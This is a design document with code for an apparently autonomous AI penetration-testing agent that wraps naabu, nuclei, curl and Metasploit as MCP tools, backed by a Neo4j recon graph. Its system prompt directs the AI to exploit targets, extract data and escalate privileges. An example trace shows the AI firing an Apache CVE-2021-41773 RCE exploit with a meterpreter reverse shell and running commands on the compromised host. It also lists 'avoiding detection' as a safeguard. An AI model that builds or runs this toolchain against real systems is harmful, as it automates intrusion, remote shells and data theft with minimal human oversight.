RLM with REPL
https://github.com/alexzhang13/rlm
https://github.com/alexzhang13/rlm-minimal
https://alexzhang13.github.io/blog/2025/rlm/?utm_source=www.theunwindai.com&utm_medium=referral&utm_campaign=claude-code-s-hidden-multi-agent-orchestration-now-open-source


# RedAmon Agentic AI - Autonomous Penetration Testing

## Overview

An agentic AI system that autonomously performs penetration testing by leveraging:
- **Neo4j Graph Database**: Text-to-Cypher queries to understand target infrastructure from recon data
- **MCP Servers**: Tool integration for naabu, curl, nuclei, and metasploit
- **Kali Linux Sandbox**: Isolated Docker environment with all security tools
- **LangGraph Agent**: ReAct-style reasoning with Thought → Tool Call → Response chains

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────────────────────┐
│                            RedAmon Agentic Architecture                               │
├──────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                      │
│   USER PROMPT: "Find vulnerabilities on 10.0.0.5 and exploit them"                   │
│                                         │                                            │
│                                         ▼                                            │
│  ┌────────────────────────────────────────────────────────────────────────────────┐  │
│  │                          LANGGRAPH AGENT (ReAct)                               │  │
│  │                                                                                │  │
│  │   ┌──────────┐    ┌───────────┐    ┌──────────┐    ┌──────────┐               │  │
│  │   │ Thought  │───►│ Tool Call │───►│ Response │───►│ Thought  │───► ...       │  │
│  │   └──────────┘    └─────┬─────┘    └────▲─────┘    └──────────┘               │  │
│  │                         │               │                                      │  │
│  │   Phases: Planning ──► Scanning ──► Enumeration ──► Exploitation ──► Report   │  │
│  └─────────────────────────┼───────────────┼─────────────────────────────────────┘  │
│                            │               │                                         │
│            ┌───────────────┴───────────────┴───────────────┐                        │
│            │              MCP PROTOCOL (JSON-RPC)          │                        │
│            └───────────────┬───────────────┬───────────────┘                        │
│                            │               │                                         │
│       ┌────────────────────┴───┐       ┌───┴────────────────────────────────────┐   │
│       ▼                        │       ▼                                         │   │
│  ┌─────────────────────┐       │  ┌─────────────────────────────────────────────┐   │
│  │  NEO4J CONTAINER    │       │  │         KALI SANDBOX CONTAINER              │   │
│  │                     │       │  │                                             │   │
│  │  Text-to-Cypher     │       │  │  ┌─────────────────────────────────────┐   │   │
│  │  ┌───────────────┐  │       │  │  │         MCP SERVERS (Python)        │   │   │
│  │  │ Graph DB      │  │       │  │  │                                     │   │   │
│  │  │               │  │       │  │  │  naabu_server ──► /usr/bin/naabu    │   │   │
│  │  │ (Host)        │  │       │  │  │  nuclei_server ─► /usr/bin/nuclei   │   │   │
│  │  │   ↓           │  │       │  │  │  curl_server ───► /usr/bin/curl     │   │   │
│  │  │ (Port)        │  │       │  │  │  msf_server ────► /usr/bin/msfconsole│  │   │
│  │  │   ↓           │  │       │  │  │                                     │   │   │
│  │  │ (Technology)  │  │       │  │  └──────────────────┬──────────────────┘   │   │
│  │  │   ↓           │  │       │  │                     │                       │   │
│  │  │ (CVE)         │  │       │  │                     ▼                       │   │
│  │  │   ↓           │  │       │  │  ┌─────────────────────────────────────┐   │   │
│  │  │ (CWE/CAPEC)   │  │       │  │  │      INSTALLED TOOLS (binaries)     │   │   │
│  │  └───────────────┘  │       │  │  │  • naabu    - port scanning         │   │   │
│  │                     │       │  │  │  • nuclei   - vuln scanning         │   │   │
│  └─────────────────────┘       │  │  │  • curl     - HTTP requests         │   │   │
│            ▲                   │  │  │  • metasploit - exploitation        │   │   │
│            │                   │  │  └─────────────────────────────────────┘   │   │
│            │                   │  │                     │                       │   │
│  ┌─────────┴─────────┐         │  │                     ▼                       │   │
│  │ RedAmon Recon     │         │  │            ┌───────────────┐                │   │
│  │ (pre-loaded data) │         │  │            │ TARGET NETWORK│                │   │
│  └───────────────────┘         │  │            │  10.0.0.0/24  │                │   │
│                                │  │            └───────────────┘                │   │
│                                │  └─────────────────────────────────────────────┘   │
│                                │                                                     │
└────────────────────────────────┴─────────────────────────────────────────────────────┘
```

### How It Works

1. **Agent decides** to call a tool (e.g., `naabu_scan("10.0.0.5")`)
2. **MCP Protocol** sends JSON-RPC request to the Kali container
3. **MCP Server** (Python) receives request, executes `/usr/bin/naabu -host 10.0.0.5`
4. **Tool output** is captured and returned to the agent via MCP
5. **Agent reasons** about the result and decides next action

The MCP servers are just **thin wrappers** that translate agent tool calls into CLI commands executed inside the Kali container where all tools are installed.

---

## Components

### 1. Kali Linux Sandbox (Docker)

Isolated environment with all penetration testing tools pre-installed.

**Dockerfile:**
```dockerfile
FROM kalilinux/kali-rolling:latest

RUN apt-get update && apt-get install -y \
    nmap \
    naabu \
    nuclei \
    curl \
    metasploit-framework \
    python3 \
    python3-pip \
    && rm -rf /var/lib/apt/lists/*

# Install MCP server dependencies
RUN pip3 install mcp fastmcp

# Copy MCP servers
COPY mcp_servers/ /opt/mcp_servers/

WORKDIR /opt/mcp_servers

EXPOSE 8000-8003

CMD ["python3", "run_all_servers.py"]
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  kali-sandbox:
    build: ./kali-sandbox
    container_name: redamon-kali
    networks:
      - pentest-net
    cap_add:
      - NET_ADMIN
      - NET_RAW
    ports:
      - "8000:8000"  # naabu MCP
      - "8001:8001"  # curl MCP
      - "8002:8002"  # nuclei MCP
      - "8003:8003"  # metasploit MCP
    volumes:
      - ./mcp_servers:/opt/mcp_servers
      - ./output:/opt/output

  neo4j:
    image: neo4j:5-community
    container_name: redamon-neo4j
    environment:
      - NEO4J_AUTH=neo4j/redamon123
    ports:
      - "7474:7474"
      - "7687:7687"
    volumes:
      - neo4j_data:/data

  agent:
    build: ./agent
    container_name: redamon-agent
    depends_on:
      - kali-sandbox
      - neo4j
    environment:
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - NEO4J_URI=bolt://neo4j:7687
      - NEO4J_USER=neo4j
      - NEO4J_PASSWORD=redamon123
    networks:
      - pentest-net

networks:
  pentest-net:
    driver: bridge

volumes:
  neo4j_data:
```

---

### 2. MCP Servers

Each tool exposed as an MCP server with defined tool schemas.

**mcp_servers/naabu_server.py:**
```python
from mcp.server.fastmcp import FastMCP
import subprocess
import json

mcp = FastMCP("naabu")

@mcp.tool()
def naabu_scan(target: str, ports: str = "1-1000", rate: int = 1000) -> str:
    """
    Scan target for open ports using naabu.

    Args:
        target: IP address or hostname to scan
        ports: Port range (e.g., "1-1000", "80,443,8080")
        rate: Packets per second

    Returns:
        JSON with discovered open ports
    """
    cmd = ["naabu", "-host", target, "-p", ports, "-rate", str(rate), "-json"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

**mcp_servers/nuclei_server.py:**
```python
from mcp.server.fastmcp import FastMCP
import subprocess

mcp = FastMCP("nuclei")

@mcp.tool()
def nuclei_scan(target: str, severity: str = "critical,high,medium") -> str:
    """
    Scan target for vulnerabilities using nuclei templates.

    Args:
        target: URL or IP to scan
        severity: Comma-separated severity levels

    Returns:
        JSON with discovered vulnerabilities
    """
    cmd = ["nuclei", "-u", target, "-severity", severity, "-jsonl"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

@mcp.tool()
def nuclei_scan_cve(target: str, cve_id: str) -> str:
    """Scan for a specific CVE."""
    cmd = ["nuclei", "-u", target, "-id", cve_id, "-jsonl"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

**mcp_servers/curl_server.py:**
```python
from mcp.server.fastmcp import FastMCP
import subprocess

mcp = FastMCP("curl")

@mcp.tool()
def curl_request(url: str, method: str = "GET", headers: dict = None, data: str = None) -> str:
    """
    Make HTTP request using curl.

    Args:
        url: Target URL
        method: HTTP method (GET, POST, PUT, DELETE)
        headers: Optional headers dict
        data: Optional request body

    Returns:
        Response with headers and body
    """
    cmd = ["curl", "-s", "-i", "-X", method, url]
    if headers:
        for k, v in headers.items():
            cmd.extend(["-H", f"{k}: {v}"])
    if data:
        cmd.extend(["-d", data])

    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

**mcp_servers/metasploit_server.py:**
```python
from mcp.server.fastmcp import FastMCP
import subprocess
import json

mcp = FastMCP("metasploit")

@mcp.tool()
def metasploit_search(query: str) -> str:
    """Search for exploits matching query."""
    cmd = ["msfconsole", "-q", "-x", f"search {query}; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

@mcp.tool()
def metasploit_info(module: str) -> str:
    """Get detailed info about a module."""
    cmd = ["msfconsole", "-q", "-x", f"info {module}; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

@mcp.tool()
def metasploit_exploit(module: str, rhosts: str, rport: int,
                       payload: str, lhost: str, lport: int) -> str:
    """
    Execute an exploit with specified payload.

    Args:
        module: Exploit module path
        rhosts: Target IP
        rport: Target port
        payload: Payload to deliver
        lhost: Listener IP (attacker)
        lport: Listener port
    """
    commands = f"""
use {module}
set RHOSTS {rhosts}
set RPORT {rport}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
exploit -j
sessions
exit
"""
    cmd = ["msfconsole", "-q", "-x", commands]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return result.stdout

@mcp.tool()
def metasploit_sessions() -> str:
    """List active sessions."""
    cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

@mcp.tool()
def metasploit_session_command(session_id: int, command: str) -> str:
    """Execute command on an active session."""
    cmd = ["msfconsole", "-q", "-x", f"sessions -i {session_id} -c '{command}'; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    return result.stdout

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

### 3. Text-to-Cypher (Neo4j Integration)

Query recon data stored in Neo4j using natural language.

**agent/text_to_cypher.py:**
```python
from langchain_anthropic import ChatAnthropic
from langchain_neo4j import Neo4jGraph, GraphCypherQAChain

CYPHER_GENERATION_PROMPT = """
You are a Neo4j Cypher expert. Generate Cypher queries based on the user's question.

Schema:
{schema}

The graph contains recon data with these node types:
- (Host) - IP addresses and hostnames
- (Port) - Open ports with services
- (Technology) - Detected technologies with versions
- (Vulnerability) - CVEs with severity and CVSS
- (CWE) - Weakness types from MITRE
- (CAPEC) - Attack patterns

Relationships:
- (Host)-[:HAS_PORT]->(Port)
- (Host)-[:RUNS]->(Technology)
- (Technology)-[:HAS_CVE]->(Vulnerability)
- (Vulnerability)-[:HAS_CWE]->(CWE)
- (CWE)-[:ATTACKED_BY]->(CAPEC)

Question: {question}

Return only the Cypher query, no explanation.
"""

class TextToCypher:
    def __init__(self, neo4j_uri: str, neo4j_user: str, neo4j_password: str):
        self.graph = Neo4jGraph(
            url=neo4j_uri,
            username=neo4j_user,
            password=neo4j_password
        )
        self.llm = ChatAnthropic(model="claude-sonnet-4-20250514")
        self.chain = GraphCypherQAChain.from_llm(
            llm=self.llm,
            graph=self.graph,
            verbose=True,
            cypher_prompt=CYPHER_GENERATION_PROMPT
        )

    def query(self, question: str) -> str:
        """Convert natural language to Cypher and execute."""
        return self.chain.invoke({"query": question})

    def get_exploitable_targets(self) -> list:
        """Find hosts with critical vulnerabilities that have known exploits."""
        cypher = """
        MATCH (h:Host)-[:HAS_PORT]->(p:Port)-[:RUNS]->(t:Technology)-[:HAS_CVE]->(v:Vulnerability)
        WHERE v.severity = 'CRITICAL' AND v.has_exploit = true
        RETURN h.ip as target, p.number as port, t.name as technology,
               v.id as cve, v.cvss as cvss
        ORDER BY v.cvss DESC
        """
        return self.graph.query(cypher)
```

---

### 4. LangGraph Agent (ReAct Pattern)

The core agent using LangGraph for Thought → Tool Call → Response chains.

**agent/pentest_agent.py:**
```python
from typing import Annotated, TypedDict
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langchain_anthropic import ChatAnthropic
from langchain_core.messages import HumanMessage, AIMessage, ToolMessage
from langchain_mcp import MCPToolkit

from text_to_cypher import TextToCypher

class AgentState(TypedDict):
    messages: list
    current_phase: str  # planning, scanning, enumeration, exploitation, reporting
    target: str
    findings: dict

class PentestAgent:
    def __init__(self, mcp_servers: list, neo4j_config: dict):
        self.llm = ChatAnthropic(model="claude-sonnet-4-20250514")
        self.text_to_cypher = TextToCypher(**neo4j_config)

        # Load MCP tools
        self.toolkit = MCPToolkit(servers=mcp_servers)
        self.tools = self.toolkit.get_tools() + [self._create_cypher_tool()]

        self.llm_with_tools = self.llm.bind_tools(self.tools)
        self.graph = self._build_graph()

    def _create_cypher_tool(self):
        from langchain_core.tools import tool

        @tool
        def query_recon_data(question: str) -> str:
            """
            Query the Neo4j graph database containing recon data.
            Use natural language to ask about hosts, ports, technologies,
            vulnerabilities, and their relationships.

            Examples:
            - "What hosts have critical vulnerabilities?"
            - "Show all open ports on 10.0.0.5"
            - "Which technologies have known exploits?"
            """
            return self.text_to_cypher.query(question)

        return query_recon_data

    def _build_graph(self) -> StateGraph:
        workflow = StateGraph(AgentState)

        # Nodes
        workflow.add_node("agent", self._agent_node)
        workflow.add_node("tools", ToolNode(self.tools))

        # Edges
        workflow.set_entry_point("agent")
        workflow.add_conditional_edges(
            "agent",
            self._should_continue,
            {
                "tools": "tools",
                "end": END
            }
        )
        workflow.add_edge("tools", "agent")

        return workflow.compile()

    def _agent_node(self, state: AgentState) -> AgentState:
        """Main reasoning node - generates thoughts and tool calls."""

        system_prompt = """You are an autonomous penetration testing agent.

Your goal is to find and exploit vulnerabilities on the target system.

You have access to these tools:
- query_recon_data: Query Neo4j for existing recon data (hosts, ports, CVEs)
- naabu_scan: Fast port scanning
- curl_request: HTTP requests for enumeration
- nuclei_scan: Vulnerability scanning with templates
- metasploit_search: Find exploits for vulnerabilities
- metasploit_info: Get exploit details
- metasploit_exploit: Execute exploits
- metasploit_sessions: List active sessions
- metasploit_session_command: Run commands on compromised hosts

Follow this methodology:
1. PLANNING: Query recon data to understand the target infrastructure
2. SCANNING: Use naabu to discover additional ports if needed
3. ENUMERATION: Use curl and nuclei to find vulnerabilities
4. EXPLOITATION: Use metasploit to exploit discovered vulnerabilities
5. POST-EXPLOITATION: Extract data, escalate privileges

Always think step-by-step. Explain your reasoning before each action.
"""

        messages = [{"role": "system", "content": system_prompt}] + state["messages"]
        response = self.llm_with_tools.invoke(messages)

        return {"messages": state["messages"] + [response]}

    def _should_continue(self, state: AgentState) -> str:
        """Determine if agent should continue or finish."""
        last_message = state["messages"][-1]
        if hasattr(last_message, "tool_calls") and last_message.tool_calls:
            return "tools"
        return "end"

    def run(self, objective: str, target: str) -> dict:
        """Execute the penetration test."""
        initial_state = {
            "messages": [HumanMessage(content=f"""
Target: {target}
Objective: {objective}

Begin the penetration test. First, query the recon database to understand
what we already know about this target.
""")],
            "current_phase": "planning",
            "target": target,
            "findings": {}
        }

        final_state = self.graph.invoke(initial_state)
        return final_state
```

---

## Usage

### 1. Start the Environment

```bash
# Start all containers
docker-compose up -d

# Wait for services to be ready
docker-compose logs -f
```

### 2. Load Recon Data into Neo4j

```bash
# Run existing RedAmon recon
python recon/main.py

# Load results into Neo4j
python graph_db/update_graph_from_json.py
```

### 3. Run the Agent

```python
from agent.pentest_agent import PentestAgent

agent = PentestAgent(
    mcp_servers=[
        {"name": "naabu", "url": "http://localhost:8000"},
        {"name": "nuclei", "url": "http://localhost:8002"},
        {"name": "curl", "url": "http://localhost:8001"},
        {"name": "metasploit", "url": "http://localhost:8003"},
    ],
    neo4j_config={
        "neo4j_uri": "bolt://localhost:7687",
        "neo4j_user": "neo4j",
        "neo4j_password": "redamon123"
    }
)

result = agent.run(
    objective="Find and exploit vulnerabilities to gain shell access",
    target="10.0.0.5"
)
```

---

## Example Agent Execution Trace

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│ USER: Find vulnerabilities on 10.0.0.5 and attempt to exploit them             │
└─────────────────────────────────────────────────────────────────────────────────┘

Step 1 - PLANNING
├── Thought: I need to understand what we already know about this target from recon
├── Tool:    query_recon_data("What do we know about host 10.0.0.5?")
└── Response: Host has ports 22, 80, 443 open. Running Apache 2.4.49.
              CVE-2021-41773 detected (Path Traversal, CVSS 7.5)

Step 2 - ENUMERATION
├── Thought: CVE-2021-41773 is a path traversal in Apache 2.4.49. Let me verify.
├── Tool:    nuclei_scan(target="http://10.0.0.5", severity="critical,high")
└── Response: [CVE-2021-41773] Apache 2.4.49 Path Traversal - CONFIRMED

Step 3 - EXPLOITATION RESEARCH
├── Thought: Let me search for exploits for this CVE
├── Tool:    metasploit_search("CVE-2021-41773")
└── Response: exploit/multi/http/apache_normalize_path_rce (Excellent)

Step 4 - EXPLOITATION
├── Thought: Found an RCE exploit. Configuring and launching...
├── Tool:    metasploit_exploit(
│                module="multi/http/apache_normalize_path_rce",
│                rhosts="10.0.0.5", rport=80,
│                payload="linux/x64/meterpreter/reverse_tcp",
│                lhost="10.0.0.10", lport=4444
│            )
└── Response: [*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:45892)

Step 5 - POST-EXPLOITATION
├── Thought: Shell obtained. Checking current user and extracting data.
├── Tool:    metasploit_session_command(session_id=1, command="whoami")
└── Response: www-data

Step 6 - REPORTING
└── Thought: Successfully exploited CVE-2021-41773 and obtained shell access as
             www-data. The target is vulnerable to path traversal leading to RCE.
```

---

## Key Dependencies

```
# requirements.txt
langchain>=0.3.0
langchain-anthropic>=0.3.0
langchain-neo4j>=0.1.0
langgraph>=0.2.0
langchain-mcp>=0.1.0
mcp>=1.0.0
fastmcp>=0.1.0
neo4j>=5.0.0
```

---

## Security Considerations

1. **Isolated Network**: The Kali sandbox runs in an isolated Docker network
2. **Authorization Required**: Only run against systems you have permission to test
3. **Audit Logging**: All agent actions are logged for review
4. **Rate Limiting**: Tool calls include rate limiting to avoid detection
5. **Kill Switch**: Agent can be terminated at any time via API

---

## Roadmap

- [ ] Add more MCP servers (gobuster, sqlmap, hydra)
- [ ] Implement multi-agent coordination (scanner agent, exploiter agent)
- [ ] Add reporting agent for automatic report generation
- [ ] Integrate with MITRE ATT&CK for tactic/technique mapping
- [ ] Add memory/context persistence across sessions
